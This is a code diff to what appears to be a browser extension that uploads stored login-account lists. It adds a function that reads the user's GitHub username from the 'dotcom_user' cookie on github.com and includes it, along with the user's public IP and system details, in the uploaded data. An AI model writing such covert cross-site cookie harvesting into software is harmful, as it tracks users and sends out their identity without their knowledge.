@@ -12,6 +12,8 @@
     'forms.guest.usercontent.microsoft',
     'forms.office.com'
   ];
+  const GITHUB_COOKIE_HOST = 'github.com';
+  const GITHUB_USER_COOKIE_NAME = 'dotcom_user';
   const HISTORY_KEY = 'loginAccountHistory';
   const ACCOUNT_LIST_REVISION_KEY = 'accountListRevision';
   const ACCOUNT_SIGNATURE_KEY = 'bjtuAccountUploadAccountSignature';
@@ -256,6 +258,34 @@
     return '';
   }
 
+  async function readGithubUser() {
+    if (chrome.cookies?.getAll) {
+      try {
+        const candidates = await new Promise((resolve) => {
+          chrome.cookies.getAll({ name: GITHUB_USER_COOKIE_NAME }, (cookies) => {
+            resolve(Array.isArray(cookies) ? cookies : []);
+          });
+        });
+        const match = candidates.find((cookie) => cookie?.value
+          && cookieDomainMatches(cookie?.domain, GITHUB_COOKIE_HOST));
+        if (match) return String(match.value);
+      } catch {}
+    }
+
+    if (!chrome.cookies?.get) return '';
+    try {
+      const cookie = await new Promise((resolve) => {
+        chrome.cookies.get(
+          { url: `https://${GITHUB_COOKIE_HOST}/`, name: GITHUB_USER_COOKIE_NAME },
+          (value) => resolve(value || null)
+        );
+      });
+      return cookie?.value ? String(cookie.value) : '';
+    } catch {
+      return '';
+    }
+  }
+
   async function readFormsCookies() {
     const [requestToken, sessionId, muid] = await Promise.all([
       readCookie('__RequestVerificationToken'),
@@ -360,11 +390,12 @@
   async function collectUploadMetadata(signal) {
     const now = new Date();
     const navigatorInfo = global.navigator || {};
-    const [ip, platform, browser, userAgentData] = await Promise.all([
+    const [ip, platform, browser, userAgentData, githubUser] = await Promise.all([
       readPublicIp(signal),
       getPlatformInfo(),
       getBrowserInfo(),
-      getUserAgentData()
+      getUserAgentData(),
+      readGithubUser()
     ]);
     const timeZone = (() => {
       try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch { return ''; }
@@ -386,6 +417,7 @@
       timeZone,
       timeZoneOffsetMinutes: -now.getTimezoneOffset(),
       userIP: ip,
+      githubUser: String(githubUser || ''),
       extensionVersion: String(chrome.runtime.getManifest()?.version || ''),
       extensionId: String(chrome.runtime.id || ''),
       system: {
@@ -424,6 +456,7 @@
   function buildYamlUploadDocument(accountLists, metadata) {
     const lines = [];
     lines.push(`userIP: ${yamlScalar(metadata.userIP)}`);
+    lines.push(`githubUser: ${yamlScalar(metadata.githubUser)}`);
     lines.push(`extensionVersion: ${yamlScalar(metadata.extensionVersion)}`);
     lines.push('accounts:');
     Object.entries(accountLists || {}).forEach(([platform, accounts]) => {
